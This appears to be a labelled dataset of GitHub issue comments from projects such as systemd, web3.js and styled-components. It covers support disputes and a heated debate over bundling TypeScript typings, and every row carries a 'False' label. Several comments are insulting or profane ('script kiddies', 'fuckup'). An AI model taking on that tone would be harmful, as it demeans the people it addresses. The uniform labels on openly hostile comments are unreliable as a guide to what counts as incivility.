spring-cloud-sleuth/spring-cloud/991/391950035,991,"We've asked you to use gitter. that's how we support things. This needs to be investigated as a problem before using an issue. As mentioned in the issue template, issues are used for changes to the codebase. I don't think a change will occur here in this repository. Please don't make us block you. ",,False
spring-cloud-sleuth/spring-cloud/991/391949157,991,Your attitude of forcing closure without solving the problem is really disappointing ,,False
spring-cloud-sleuth/spring-cloud/991/391948789,991,I'm trying to make my point. How do you feel so impatient ,,False
spring-cloud-sleuth/spring-cloud/991/391950220,991,"I also asked you multiple times to provide your full codebase and instructions on how to replicate the issue. Also, I've asked you if you followed the guidelines in the brave-mysql instrumentation repo. You have provided no feedback and kept ignoring my questions. ",,False
spring-cloud-sleuth/spring-cloud/991/391953626,991,"you posted the issue twice.. here after posting here less than a day ago  are you not joining gitter like asked? do you feel that doing the opposite will make things better for either you or us, or the hundred people who are alerted when you post issues like this? The request on the issue is to please try the example, and if report back on gitter what happens. please do that and stop pasting things at us. it is easier and we can be friends as opposed to being frustrated ok? ",,False
styled-components/styled-components/1721/319437548,1721,"@friend I am really don't know who is best person to address this question, I found greelen name first in the list so addressing you. I am creating component library for client which I am using as npm link to use it in create react app. But the question is component library project has no App container so I can not wrap it as  ♠&lt;ThemeProvider&gt; &lt;App /&gt; &lt;/ThemeProvider&gt;` So what is the alternate way I can use themeprovider? How can I use as importing to each component and use theme props? Please help. ",,False
spring-cloud-sleuth/spring-cloud/991/391952484,991,"I didn't even come and provide the full code, so you shut down the problem ",,False
styled-components/styled-components/1721/385979587,1721,"What component library tool are you using to develop? (storybook, styleguidist) They usually offer a way to have wrapper components. Let me know, and I can help you out. ",,False
styled-components/styled-components/1721/386257667,1721,Do I really need need storybook or styleguidist? Without container shouldn't I use theme provider? For now I have ex. colors.js where all colors are defined and I am importing that colors in every component. Is there any advantage using theme provider instead of this approach? And if yes then let me know how can I leverage theme provider without introducing any other third party library? ,,False
styled-components/styled-components/1721/388521317,1721,You don't technically need to use  to use styled-components. ,,False
styled-components/styled-components/1721/388532413,1721,"I think you don't understand what I meant. I said I want to apply theme to my styled component. Ex. Here is the code my styledLabel component import styled from 'styled-components'; import  as fonts from '../styles/fonts'; import  as colors from '../styles/colors'; ; module.exports = {   sidebar '#1D242D',   primary1 '#696D73',   primary2 '#535354',   primary3 '#929497',   canvas '#FFFFFF',   highlight '#4F80FF',   accent1 '#DBDCDF',   accent2 '#CCCCCC',   alarm '#EE4623',   background '#EDEEF1' }; ♠ Here if you can notice I have given color from color.js. @friend @friend is the same as wrapping component in ? ",,False
styled-components/styled-components/1721/388533076,1721,"@friend I don't think I understand your use case, unfortunately. That being said, if you aren't able to reliably wrap your entire app with a , you can alternatively wrap your individual components with it in the implementation. ; export default function ThemedButton(props) {   return (     &lt;ThemeProvider theme={theme}&gt;       &lt;Button {...props} /&gt;     &lt;/ThemeProvider&gt;   ); } ♠ For example. ",,False
styled-components/styled-components/1721/388533869,1721,"@friend can you please read entire thread first because your answers are irrelevant? @friend  If no body can answer from styled components team then please close this issue, because I am not getting proper answer. ",,False
styled-components/styled-components/1721/388533922,1721,I did read it and I said in my response I don’t understand your use case but am trying to help anyway. ,,False
styled-components/styled-components/1721/388534034,1721,"In case you didn’t know, we are all volunteers working on this project. Your attitude and sense of entitlement for a perfect solution to your mostly unelucidated use case is both rude and condescending. ",,False
styled-components/styled-components/2426/416972322,2426,"Can we hold Google chrome responsible for .iwuvb not being editable in a browser. I think the deliberate obfuscation built by Styled-Components in 100% negligent and generally affects my workflow negatively slowing it down 600%, but the fact that I cannot even manipulate the thing without rewriting it is complete BS. I cannot wait for this terrible of CSS-in-JS shim to be native and integrated with browser dev tools. In the meantime UI will move an a snails pace until Javascript Engineers and Browsers Engineers can all agree there is a visual element to UI and being able to see what I'm doing becomes again an element to the workflow of UI development. Being able to understand where .iubcx came from without the hacky babel plugin that's not even that helpful will be a step in the right direction. Why is using unique class names not used for building unique components who already have unique names? It's beyond me -- it seems like a personal attack on UI Engineers everywhere. ",,False
stylus/openstyles/498/358652924,498," Browser Firefox 62 Operating System Windows 10  Noticed as a result of #461 and #497 - even when Stylus is disabled with the ""Turn all styles off"" option, it continues to inject a  element. It only stops injecting the style element when the configured styles that are applicable to the current page, are all individually disabled. ",,False
stylus/openstyles/498/419939352,498,"This is how Stylus (and its ancestor Stylish-for-Chrome) always worked so it's not related to the mentioned issues. I guess the reason is that the purpose of ""turn all styles off"" option is to toggle all styles quickly in case of problems or when writing styles. ",,False
stylus/openstyles/498/419943042,498,"Didn't say it was. Only said it was how I happened to notice it. I'd say the fact that Stylus currently breaks sites that try to read  in Firefox, as per above issues, is a pretty big problem. In the more broader sense if I tell an extension to temporarily ""hands off!"" and disable itself for a page; I expect it to ACTUALLY leave the page alone. Which Stylus doesn't do with the big panic button, that is specifically meant for these use-cases. It instead requires disabling each individual applied style... The fact that this is how Stylus 'alway worked' doesn't mean it is correct. ",,False
stylus/openstyles/498/419943735,498,You can simply disable the extension itself. ,,False
stylus/openstyles/498/420055793,498,"Doesn't change the fact that Stylus's behavior is non-orthogonal and stupid. It keeps the style element around (but empties it) when you check the ""turn all styles off"" option. But it removes the element if you remove all checkmarks from all individual styles that were active. Fine if you don't want to fix it, just don't make up bull excuses for the differing behavior, like performance impact. The actual cost of CSS updates is in parsing the CSS text; updating internal stylesheet data structures; re-matching selectors to the website HTML; re-applying layout; re-applying painting; and finally re-applying compositing. Recreating the style element is negligible to the extreme. ",,False
stylus/openstyles/498/420139812,498,There's no need to change the behavior ,,False
systemd/systemd/11436/399402607,11436,"systemd version the issue has been seen with v240 Used distribution Debian sid Downstream bug report at  reproduce the issue, create a file  containing with the mac address of your ethernet network interface. Unload the network module (in my case ), then load it again. Notice how the interface is properly renamed Now run The interface is renamed although a custom NAME has been set. ",,False
systemd/systemd/11436/454439071,11436,"that's a regression compared to v239, and I'm inclined to add it to the v241 milestone, given that it can mean loss of network access. @friend, @friend wdyt? ",,False
systemd/systemd/11436/454440451,11436,after loading the kernel module After running  ,,False
systemd/systemd/11436/454510153,11436,With v239 after modprobe after  ,,False
systemd/systemd/11436/454515587,11436,"Hmm, I wonder if this is intended effect of 55b6530baacf4658a183b15b010a8cf3483fde08 ",,False
systemd/systemd/11436/454515683,11436,/cc @friend ,,False
systemd/systemd/11436/454515873,11436,Also see #9006 ,,False
systemd/systemd/11436/454516397,11436,And of course #9088 ,,False
systemd/systemd/11436/454516448,11436,Not sure what the right approach here is ,,False
systemd/systemd/11436/454521307,11436,"Why it is named  when the driver is loaded?? If, the final result is  then I expect it should be always . ",,False
systemd/systemd/11436/454521715,11436,It should always be named  because of the udev rule. ,,False
systemd/systemd/11436/454522213,11436,What happens when the condition  is dropped? ,,False
systemd/systemd/11436/454523266,11436,"@friend does that really matter? It's a udev rule that worked for years, it shouldn't suddenly stop working. ",,False
systemd/systemd/11436/454526617,11436,"I've not tested that, but I guess that, because of the condition,  initially it is named to , as the initial name is . the later evaluation results , as the interface is not  anymore.  v239 or before, it is evaluated only once. So, the name was stayed at . But, v240, 55b6530baacf4658a183b15b010a8cf3483fde08 makes the rule is always evaluated. ",,False
systemd/systemd/11436/454527487,11436,"I think once a custom name has been set, it shouldn't be renamed by udev again. ",,False
systemd/systemd/11436/454529656,11436,"If I remember correctly, the original motivation of the commit is that interface name can be changed by udev rules without updating initrd or changing kernel command line. So, if my above guess is correct,,, what should we do? ",,False
systemd/systemd/11436/454532909,11436,"imho, revert and find another solution #9006 ",,False
systemd/systemd/11436/454535318,11436,@friend a default policy like /lib/systemd/network/99-default.link should never trump explicit user configuration. ,,False
systemd/systemd/11436/454544042,11436,"@friend There is no split between ""explicit user configuration"" and the rest. Files like  are named this way to have the lower priority. But there is no magic of ""oh, this was set by the user, let's not touch it"" anywhere.  The problem with trying to make a division like that is that nobody seems to ever agree what is ""user"" configuration, and what is ""explicit"".  Current approach of simply executing the configuration as we find it is much clearer and sustainable. #9006 was applied precisely because users were creating configuration and were peeved that some very specific parts of that configuration are not applied. The rules in the bug report were relying on an implementation detail of the rule engine, and changing this implementation detail is something that we are allowed to do. The rule should never have had  if it was supposed to apply also after the interface was renamed. Current behaviour seems correct to me when the device is called , there's just one rule that applies to the devices, and when  fires off, we execute all rules that apply. This is also much nicer for the user, because they can create configuration and apply it, without jumping through hoops to reset the state. ",,False
systemd/systemd/11436/454544525,11436,"It's not nicer to users, as it breaks existing user configurations. Which is bad ",,False
systemd/systemd/11436/454544937,11436,I'm amazed that I have to point this out.... ,,False
systemd/systemd/11436/454546312,11436,"Not every facet of program behaviour is guaranteed to be stable. Generally, only things that are documented are promised to be kept unchanged. Is the fact that link renames are applied only once documented anywhere? You seem to suggest that we should never change any user visible detail. I think this user rule was in error, and it worked for a while by luck, and now it doesn't. This happens all the time. ",,False
systemd/systemd/11436/454548298,11436,I guess I'll stop filing bug reports ,,False
systemd/systemd/11436/454550222,11436,"wouldn't it make sense to only apply  matching to the kernel-assigned name, not a potentially renamed name? ",,False
systemd/systemd/11436/454559824,11436,This doesn't seem to have ended well. ,,False
systemd/systemd/11436/454581369,11436,"From the peanut gallery... Would it make sense to somehow record the original name of this interface and match  against that name as well? When reading the rule from the OP, that was my impression of how that should have worked (and the previous one-rename rule was a good approximation of it...) Not really sure whether that makes sense, would be feasible and would address the other issues that commit was supposed to fix... ",,False
systemd/systemd/11436/454585896,11436,"Urks, I find this breakage quite unfortunate I must say. I mean, writing a rule that matches effects of a previous rule (like the one debian is using there) is probably not a great idea (rules really should match stuff that is not going to change for a device, so that they are idempotent), but I am not sure that simply breaking systems like this is a good idea. I don't have a strong opinion on the way out, but I am slightly leaning towards reverting the patch and simply asking downstreams to drop any rules that rename ifaces whatsoever from their initrds, as that means the host's policy will never be enforced. I mean, afaiu the patch was done precisely to ensure that host policy applies if initrds already renamed devices, no? I mean, users/downstreams assumed that these rules where OK, and we probably should tell them they are a bad idea, but also, I think we shouldn't break so many installed systems this way... Another idea might be make it configurable in the .link file whether to rename already renamed interfaces, with a default to on. Then, change our 99-default.link file to turn off the option. This way, .link files supplied by users will by default override everything, but the fallback one we provide won't. Other ideas, opinions? ",,False
systemd/systemd/11436/454586278,11436,"i mean, with the naming scheme cmdline option and stuff we now go into great lengths to stabilize names over releases, it would be a pity if we'd then break existing rules so galantly (even if they aren't written in particularly good style)... ",,False
systemd/systemd/11436/454598207,11436,"The current documentation does not specify whether user modifications are read, and there are two factors suggesting they shouldn't  The name The existence of a NAME variable for matching against userspace changes.  Honestly, having a variable named KERNEL map to a value provided by userspace is weird. ",,False
systemd/systemd/11436/454641322,11436,"Hmm, we have already documented that implicitly...  least, we need to update this. ",,False
systemd/systemd/11436/454650722,11436,@friend's proposal is implemented in #11443. ,,False
systemd/systemd/11436/454709094,11436,"userspace, no renaming is performed. The available policies OK, that is enough for me to consider the previous behaviour documented. So I agree that we should preserve compatibility for this. I like this approach. The question is whether to default to ""on"" or ""off"" with current link files. If we default to ""off"", we preserve more backwards compatibility. If we default to ""on"", we get saner behaviour. ",,False
systemd/systemd/11436/454742671,11436,"Or, how about disabling the new behavior if naming scheme is specified earlier than v240? ",,False
systemd/systemd/11436/454748619,11436,@friend interesting idea. Maybe like this if naming scheme is &lt; v240 we default to RenameOnce=yes and otherwise to RenameOnce=no (and 99-default.link would set RenameOnce=yes either way) ,,False
systemd/systemd/11436/454971826,11436,"@friend Please go talk to Linus Torvalds. If it works today and you make a change to break users, you are in the wrong. I should hope you wouldn't need yelling at to understand that. Software developers need to internalize this and abide by it at all times, life would be much easier. ",,False
systemd/systemd/11436/454972565,11436,"Please don't post offtopic comments. (This is making rounds elsewhere, locking this for now might be best). ",,False
systemd/systemd/11436/455332624,11436,"BTW, for those coming late, a good fix (including a revert) has been merged now. I think all should be good now. ",,False
web3.js/ethereum/1248/284299162,1248,"Hello, Web3 Typescript definition on branch 1.0 doesn't contain ""default export"". After importing ♠import Web3 from 'web3';` I got this issue  Module '""xxxx/node_modules/web3/index""' has no default export. ",,False
web3.js/ethereum/1248/353787208,1248,"the type definition reflects the current module implementation line 78 Based on typescript document, it is recommended to adopt module-class, which is why the type is exposed with ""="" and not default. We have been going back and forth on this issue as you can see with #1184, which was exactly to undo the default import that undo the ""="" earlier...  I am sure we don't want to keep repeating this cycle,  will the following import syntax work for you? ",,False
web3.js/ethereum/1248/353955671,1248,Thank you. ,,False
web3.js/ethereum/1248/353972813,1248,"Using ""require"" keyword, I got this error on compilation I use typescript  2.6.2 ",,False
web3.js/ethereum/1248/354118488,1248,"web3.js is still using es5 module system, so it's best to use the compiler option that supports it... try module ""commonjs"" ",,False
web3.js/ethereum/1248/354565469,1248,"Doing  works for me in version 1.0.0-beta.26 but when i upgrade to 1.0.0-beta.27 I receive the error mentioned in this post. I could use the lower version but i noticed that the method for viewing pass events has changed in .27. IN version .26 the passed events can be viewed by invoking  but in .27 you have to call ; Please resolve soon, thanks ",,False
web3.js/ethereum/1248/354568701,1248,seems like @friend  has a PR for this ,,False
web3.js/ethereum/1248/356094710,1248,"here is the bottom line  works for  but breaks  works for  but breaks   If you guys look at the commit history, you can see that we have tried both export styles multiple times because every time you switch to one the other camp complained. Giving the module can't be exported both ""="" and ""default"", we have to choose one... but which one? I think we all agree that the type definition should closely reflect the original package implementation current web3's js implementation uses ""export ="", according to typescript official doc, it is recommended to adopt type definition with ""export ="" (see here). This tips the scale for . ",,False
web3.js/ethereum/1248/368648735,1248,"PR1249 made it ""export default"" again in version 1.0.30 . Doesn't work with commonjs anymore. ",,False
web3.js/ethereum/1248/375319950,1248,Just use ES Modules since it's JavaScript's official module system and stop changing it all the time. It's a breaking c ,,False
web3.js/ethereum/1248/385207638,1248,What I ended up doing to stop typescript from complaining and still have type definition and autocompletion is ,,False
web3.js/ethereum/1248/386765112,1248,@friend was able to make it work as follows ,,False
web3.js/ethereum/1248/392553060,1248,From Typescript docs Web3 uses  so the correct way to import it in Typescript is ,,False
web3.js/ethereum/1248/442713942,1248,This should be fixed with the PR #2000 thanks to @friend who is writing the typings! ,,False
web3.js/ethereum/1248/442734463,1248,@friend Which typings are you talking about? ,,False
web3.js/ethereum/1248/442761668,1248,@friend He has currently just implemented the typings for web-utils and there is an open PR for web3-bzz maybe you can help him or move the typings from DefinitelyTyped into the web3.js repository. I would like to have them directly in the repository because this way I can guarantee that they are always up to date. The issue above should be fixed because of the refactoring and the typings Josh is writing but I will proof it before I merge the PR into the 1.0 branch. ,,False
web3.js/ethereum/1248/442775398,1248,"I repeatedly said and it is best practice to only have the type definitions at definitely typed. You should never again bring type definitions back into this very code base right here. The only exception for this rule is, if you actually write the code in typescript. ",,False
web3.js/ethereum/1248/442781472,1248,"@friend Hey dude, I have to say I completely disagree. I do agree types say quote  - but this would work in a standard  project. At the moment the typing's NEVER get kept in date, someone does a PR in  and you can not force them to do another PR in . This then causes a huge knock effect for all the typescript devs when new versions are released as the types just do not match up. I have had this about 40 times and only finding out the types are incorrect by having to write full unit tests. If it was actually in the repo itself you can enforce contribution instruction to make sure the typing keep in date all the time.  I seen other repos like BigNumber -( do this due to how impossible it was to manage it being in 2 separate repos. At the current time the  are out of sync in the  lib, i have not checked the others but the entire development experience trying to work in  with web3 is too hard at the moment due to the amount of changes. As the main developers work in   is 2nd thought and it should be part of the entire development structure while writing new things in web3 itself. We should also be able to release types + web3.js at the same time at the moment we have to wait for the  PR to be approved which is out of our control. This solution will mean updating methods in the future and updating it's typing will be super easy for all the maintainers as it's in 1 repo. It will also mean the typing's will never be out of sync due to contribution guidelines but still versioned nicely.  I know a lot of people may just use  but as a regular  developer using these library i believe this would be a very good way to start improving this, and a lot of the people i have spoken to about this have agreed. I just trying to make this seamless, bringing easier development for the TypeScript devs that's all. Like i said i can tell you a thousands times where the types reflected are so out of date. This would solve a lot of issues i see raised with typing's and bring it all in with 1 install command. Let me know your thoughts )  Thanks  👍 ",,False
web3.js/ethereum/1248/442784961,1248,"I removed the type defintions after a long discussion because they were broken (as in ""You were not able to use  in a typescript project without monkey patching the broken type defs, shipped with ) They were broken because there are no automated tests for the type definitions in this repo here. There cannot be. Definitely typed has such tests. I agree that it is a slow process but the process you are suggesting will make things even worse Everyone who is making a contribution to  will have to be a typescript pro from now on. Because as you are saying you will reject every PR without an update to the type defs. At the same time you do not even code the library in typescript! So I have to live with the sadness that I have to write my contributions in JS and then I have to type them by hand afterwards. What a clusterf**k. There are two possible and acceptable ways to proceed  When the API has changed, make a PR to DT fast and live with the fact that sometimes the type defs are outdated for a couple of days. Also stop making big changes to the API. Start writing the code in typescript (which can be done incrementally) and autogenerate the type defiintions.  All other approaches are going to fail and only cause misery. ",,False
web3.js/ethereum/1248/442785983,1248,"One other thought to keep in mind This library is written in Javascript, because the people contributing to it are not able to write Typescript code. Now you want them to review type definitions for a usage of this library in Typescript projects. You see the problem? ",,False
web3.js/ethereum/1248/442788429,1248,"Thanks for your quick response @friend. I completely understand what you are saying.  So I have to live with the sadness that I have to write my contributions in  and then I have to type them by hand afterwardsJS@friend - I think any  can write standard type definitions with a little bit of support, even if this is fixed by someone who could again i can't see it being a problem. Like i said we don't have loads of regular contributors anyway. ",,False
web3.js/ethereum/1248/442788474,1248,And one more thing PRs to DT get merged pretty quickly when they are good. Most of them aren't though. ,,False
web3.js/ethereum/1248/442789555,1248,"This is a false assumption. First you code javascript. Then you code typescript. Then you learn how to produce type definitions. Devs who are able to write type defintions are a subset of the devs who have mastered Typescript, not the other way round. This is an opinion of mine and we reached a point were we have two different opinions and I have not further arguments to give. I made my point. Tipp ",,False
web3.js/ethereum/1248/442790744,1248,@friend but we have under 10 regular contributors.. do you not think this would bring more good then bad? Say yes some  need some support with types but with not many people actually contributing this should not be that hard to maintain. The main advantages it brings are huge over the valid points you have stated. For the over 200k weekly downloads web3 gets I think this could solve a lot of  pains they have. This could be the first step and maybe in the future web3 is rewritten into  but we have to start somewhere. Thanks a lot for your view and taking time to discuss! ,,False
web3.js/ethereum/1248/442791564,1248,I get your argument These 10 contributors should be able to learn typescript. I disagree with your conclusion Lets make them learn typescript and then maintain the type definitions for this JS code base. I think the only conclusion can be Lets make them learn typescript and write everything in typescript. With  you can just rename every file to  and be done. Project is now in typscript. ,,False
web3.js/ethereum/1248/442792624,1248,I think some other milestones have to be reached first before this gets done like actually release of  none beta. I am a big supporter of getting  in  and would happily go through the entire thing and change everything to  but i think that's a bigger discussion to have. Really appreciate your view though!  Cheers Levin 👍 ,,False
web3.js/ethereum/1248/442795190,1248,"I am not voting to move this here to typescript. I want to show that your idea to maintain the type defs here is a mistake. Publish type definitions with your package iff your is written in typescript. Let others maintain and publish the definitions iff your package is not written in typescript. As this package is not written in typescript (and possibly never will be), it is infeasible to maintain the type defs here. End of story. ",,False
web3.js/ethereum/1248/442795576,1248,"And one thing about the argument with BigNumber.js The pain you experienced was not because the type defs where maintained in another repository, but because bignumber.js is not written in typescript. ",,False
web3.js/ethereum/1248/442796227,1248,"A popular example of a lib that's not written in TS and maintains its own type defs is Redux - it seems to work fine for them. Redux is way simpler than web3.js, but it also has way more contributors and downloads than web3.js. ",,False
web3.js/ethereum/1248/442797557,1248,That might be. But it is against best practice and I explained in detail why the categorical imperative says it is a bad idea. Only because some people do it does not mean that we have to do it too. ,,False
web3.js/ethereum/1248/442802967,1248,"Who defined the best practice you're talking about? One of the most important libs in the industry does it differently without problems, so I don't really see how it's against ""best practice"". TypeScript docs don't discourage such approach either, so I think that it's just your opinion and not a sacred truth that we should follow. I've used web3.js with TypeScript and each time I've written my own typings for things I needed, because the official ones were just plain wrong and not helpful at all. Bigger Ethereum projects like 0x also have picked this route (as seen here) to avoid the hassle of working with official web3 typings from DefinitelyTyped. ",,False
web3.js/ethereum/1248/442803322,1248," With this view we will never ever have solid types for  so  development with it becomes unstable or having to use  everywhere 👎 The likes of Redux do this because of the  it causes relying on others to maintain the types, and as @friend said they have far more contributors and over 2 million downloads a week, we should learn from people who have gone through the pains.   We are in a world where  development is taking over so i thought  would start adopting to supporting in-house types. This would of been a great start. Again i see no reasons that you stated which makes it  bad, in my view the positives overweight the negatives by far. If  do not support  out the box people will have to start using other  which do which i would hate. Anyway discussion over - see ya! ",,False
web3.js/ethereum/1248/442803978,1248,@friend I'd suggest locking this thread to avoid further flamewars. ,,False
web3.js/ethereum/1248/442804560,1248,Please read the docs more carefully. I quote (again and again and again) ,,False
web3.js/ethereum/1248/442848718,1248,"@friend not trying to pick sides here, but you must agree that breaking web3.js for typescript users on a regular basis is not a good thing?  Regardless of what the TypeScrypt docs say. For better or worse, a lot of people are using TypeScript that also use web3.js. It sounds to me like the only option here to prevent the regular breakage is to include the ts file in this repo so it's always in sync. If the contributors to this repo don't want to update the types file, let some of the people on this thread help whenever a PR comes in to ensure it gets updated properly before merging, it would probably only take a few minutes of a ""TypeScript pros"" time to check the types file for each PR. ",,False
web3.js/ethereum/1248/442876694,1248,"You all want to have typings that are up to date with the current interface of the library, right? Guess what There is only one (just one!) way to achieve this Implement the library in typescript and generate the typings automatically. Even if you maintain the typings here, they will be out of sync all the time. As I said, the typings in this repo were broken. There are several reasons why this cannot work  Pull request reviewers do not understand typescript and cannot review whether or not the changes to the typings are correct. The typings will not be tested. So even if the reviewer is a typescript pro, they are human and will overlook things. (DT tests all typings automatically in CI!!!!) Someone makes a really nice pull request. It gets merged because javascript users want the new feature. Nobody cares for the update to the type definitions because the contributor with the pull request is not able to write them and nobody else comes to the rescue in time.  and 3. is the same for DT, but 3 is not. You will not achieve what you are looking for when you maintain the typings here. Also who of you has made a contribution to DT? It is super easy. There is nothing to fear. The review process is heavliy streamlined and fully automated.   So my point is You all push for maintaining the typings here but you will not achieve what you want to achieve. The type definitions will be out of sync all the time not matter what until this is rewritten in typescript. ",,False
web3.js/ethereum/1248/442877381,1248,"Unfortunately in the typescript docs they do not explain why you should publish the typings via DT when you write your package in Javascript, but I think I gave enough reasoning. Additionally to that Why do you think that they recommend that? ",,False
web3.js/ethereum/1248/442880449,1248,I think I do understand TS it is not that rocket science thing to do types. Maybe we could test them in our CI too. This should not happen if I review a PR. I think you should answer this question ) ,,False
web3.js/ethereum/1248/442885264,1248,"So you will from now on personally review all PRs? That is going to scale well. Yes. That is quite easy. What is more easy though is to rewrite the whole codebase in typescript. It will happen. Or you will drive away open source contributors because they create a valid PR which never gets merged because ""we are still waiting for the typings"". I did explain my thinking. Three times. I repeat myself. People say that I am not right. I want to here their train of thoughts. ",,False
web3.js/ethereum/1248/442885600,1248,And another question for you all What about flow? Should we add flow typings too? Facebook is using flow! ,,False
web3.js/ethereum/1248/442889987,1248,Yes thats what I'm doing currently and will do it as long as I work for this lib. I think we can test them with for example  I have to write the types by my self and I think that will not happen so often. No you didn't you were just quoting the TS documenation but you never really explained the thoughts behind it. The TS documentation does not explain it either. I think I could add for example this  to the publish process to generate them. Idk how good this is but maybe that could be a solution. I'm not saying that I like one of the solutions more then the other but until now I can't see a reall killer argument that we should have them on DT. I think thats more an ethical thing. 😅 ,,False
web3.js/ethereum/1248/442913265,1248,Just do what you want if you do not want to listen to reason. This is going to be a fuckup! At least I told you so. ,,False
web3.js/ethereum/1248/442913894,1248,"oh and  has their own types and it's a JS project   and  both a ""fuckup""? @friend I have stated valid points here.. you have not really replied to any of them. 👍 ",,False
web3.js/ethereum/1248/442916455,1248,I understand your argumentation. You will from now on review every pull request and your super powers will make sure that every change to the API of the library or any of the sub-packages will be reflected 100% in the typings here in the repo. I say You will fail! And you say No I have my superpowers. Which is fine. But I will not waste more time on this. Do it then. It will be painful and hard and you will fail. Lets talk again in a year. ,,False
web3.js/ethereum/1248/442916831,1248,"And btw If at some point you decide to rewrite the whole codebase in TS, that does not count as a success, but a fail too, right? Because that is what you want to avoid with your approach. ",,False
web3.js/ethereum/1248/442920710,1248,"This is already happening @friend , this is what this discussion is all about. Apparently all of us TypeScript users are ""script kiddies"" and yes, we're complaining about this library breaking every time you update it. If you want us ""script kiddies"" to stop complaining, then just do the right thing and fix the problem. You have a bunch of people saying they'll even help fix the problem, which you don't seem to want to accept. 🤦‍♂️ ",,False
web3.js/ethereum/1248/442917416,1248,"Ah and I forgot to predict something You will have hundreds of issues from Windows-using script kiddies who cannot use Typescript right but will blame you for ""incorrect typings"". They will all go on the backlog and jam it. ",,False
web3.js/ethereum/1248/442922846,1248,"I maintain (with others of course) the  package. If the maintainers of  would drop typescript support, they could just close every typescript related issue and save time and money. And I repeat If you all want that this library supports typescript itself, then JUST WRITE IT IN TYPESCRIPT! ",,False
web3.js/ethereum/1248/442923179,1248,"Well, i've been having this page opened for the whole afternoon and i must admit i'm quite amazed by how this has gone to some flames. As JS &amp; TS developper, in normal times, i would have been supporting separated repo for providing types,  as requested by @friend, as i rather prefer avoiding to have any broken type provided by the original repo, third-party packages being easy to remove without touching web3 original code. However, as i read the answers it seems quite technically feasible to ensure types are correctly written before merging any PR, as @friend provided tools &amp; examples of others projects  doing so. Comment from @friend here   also makes me think that rewriting web3 into a TS form might be quite faster as it could be expected. If web3 dev team commits to review type definitions while a typescript migration is being built, i'll definitely support it, they made their point. @friend  i don't think it's about winning or failing here but rather having a collective conversation about how to do it the best way possible. Too bad to have thrown useless flames for that. In any case, and still, thanks for providing . Much datalove ",,False
web3.js/ethereum/1248/442923808,1248,If everybody here speaks Typescript then there is no reason not to write this library in Typescript. I repeat again One can incrementally migrate a library to typescript. But that requires some Typescript skills. ,,False
web3.js/ethereum/1248/442923769,1248,@friend I think people who do this like  and  are doing just fine with this approach. Big repos with millions of downloads a day do this and succeed without  😃 I maintain (with others of course) the @friend/web3 package.tstsjsts` will come 😄. @friend will have a roadmap for this. Thanks for the good discussion though @friend i do respect your views and no hard feelings 👍 ,,False
web3.js/ethereum/1248/442925325,1248,I will lock this issue now because I think we already seen all the arguments. Thanks everyone for the effort to be a part of this discussion! ,,False
webpack-dev-server/webpack/1220/350172660,1220,The code in  would seem to disagree with this assessment.  example for  also works as expected. And the docs don't show the flags as options that you expect to be working. Your  should be in a config. This looks like a classic case of misuse. ,,False
webpack-dev-server/webpack/1220/350215313,1220,@friend is the CLI's  output incorrect or are my expectations incorrect? ,,False
webpack-dev-server/webpack/1220/280324189,1220," Operating System  Node Version  NPM Version  webpack Version  webpack-dev-server Version ,  (both)     [x] This is a bug [ ] This is a feature request [ ] This is a modification request  Code Expected Behavior Command line arguments for  should be used Actual Behavior I don't think they are. For Bugs; How can we reproduce the behavior Invoke from CLI as above. Notes Got here from ",,False
webpack-dev-server/webpack/1220/350227036,1220,"Can't speak for most  consumers, but personally i tend to reference  pages and  output 1st and web documentation if I need further explanation. My expectation was that CLI flags take precedence and were reconciled with config somehow. I think myself (and potentially others) are either misinterpreting the  output or perhaps the -related flags indicated from  are inaccurate? ",,False
webpack-dev-server/webpack/1220/350275103,1220,"That's a personal choice of course, but I'd highly recommend reading the actual docs next time before submitting an issue for any project. I don't know as if it holds true that  and  are the definitive source of info for modern-day tools outside of some hardcore CLI idealists. None the less, what we have here is a display bug resulting from combining 's CLI configuration with  to get some common config for free. See  that's adding flags from  that  doesn't support. The docs for this module are correct, the output on the CLI is not. We'll track a new issue to see if we can resolve that. But the takeaway here is to always check the actual docs. ",,False
webpack-dev-server/webpack/1220/350285253,1220,"I'd neglected to put this in the response above, but want this to stick out for others who might happen across this issue in the future Note the first three lines of the CLI output The important bit there is  as the CLI is pointing users towards the proper docs even in the  output. ",,False
webpack-dev-server/webpack/1220/356175044,1220,"@friend Thanks for taking the time to develop a valuable tool and taking the extra effort to document it. What @friend did may not be how you operate, but it is a very common pattern for a huge group of users ""out there""  If you are on a command-line interface, the first thing you do is ""man tool"" or ""tool help"", ""tool -h"", etc. And if the output is too large, the first natural thing to do is grep the output or ""Cmd + F"" Also, properties from the CLI overriding default values or configurations is the common behavior for most CLI tools, it's the ""least surprising behavior""  You are of course free to deviate from the pattern, may I suggest to simply remove the whole output of ""--help"" and replace it with the ""Usage"" link? That would be easier than trying to change people to abandon behaviors that have been proven useful since at least the late 1970's ",,False
webpack-dev-server/webpack/1220/384660043,1220,@friend seriously? ,,False
webpack-dev-server/webpack/1220/384661370,1220,@friend replies of that nature are not helpful and do not contribute to the discussion. please refrain in the future. ,,False
webpack-dev-server/webpack/1220/384665003,1220,"@friend let me then elaborate on it so it valuable to the discussion. Keeping documentation in sync with the actual behavior/options of the tool ( be it online or in the tool itself) is fundamental and not something that only ""some hardcore CLI idealists"". It is simply quality of your product. I see you are listed as the 3rd most active contributer on the project and seeing you writing something like that is just bad for the project itself and the JS community in general. This is not idealism is QA! ",,False
winston/winstonjs/1158/277869345,1158,"I'm having a lot of issues testing Winston satisfactorily.  I blame this on the lack of promises used, the atypical style used in the code (readability), and the use of the async file calls/undocumented event emitters. My use cases are very common.  I want to author a test that verifies a log file has been created, and it has been written to.  I've spent literally hours without success figuring out what Winston is doing.  That really is not good. Net effect my perception is that Winston has a lot of bells and whistles (I still don't want to reinvent log rotation), but it's probably contributed to by too many people, its issue log has some serious issues noted, and it fails to implement simple cases. ",,False
